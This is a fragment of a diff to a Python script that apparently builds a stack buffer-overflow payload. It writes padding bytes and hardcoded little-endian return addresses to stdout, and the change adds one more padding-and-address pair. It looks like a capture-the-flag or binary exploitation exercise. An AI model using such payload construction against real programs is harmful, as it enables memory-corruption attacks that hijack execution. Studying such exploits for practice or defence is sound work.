@@ -13,3 +13,6 @@ sys.stdout.buffer.write(b"BBBBBBBB")
 sys.stdout.buffer.write(0x7ffffff6d160.to_bytes(8, 'little'))
 sys.stdout.buffer.write(b"AAAAAAAA")
 sys.stdout.buffer.write(0x0000000000401e21.to_bytes(8, 'little'))
+sys.stdout.buffer.write(b"AAAAAAAA")
+sys.stdout.buffer.write(0x0000000000401e21.to_bytes(8, 'little'))
+
